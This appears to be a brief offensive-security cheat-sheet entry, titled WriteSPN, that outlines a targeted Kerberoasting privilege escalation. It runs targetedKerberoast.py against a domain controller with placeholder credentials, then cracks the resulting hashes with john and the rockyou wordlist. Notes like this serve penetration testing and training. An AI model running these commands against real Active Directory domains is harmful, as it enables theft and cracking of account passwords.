item.title: WriteSPN
item.description: Privesc #1: Targeted Kerberoast Linux 1. Targeted Kerberoast # Password python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>' 2. Hash Crack john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE> Ref: targetedKerberoast
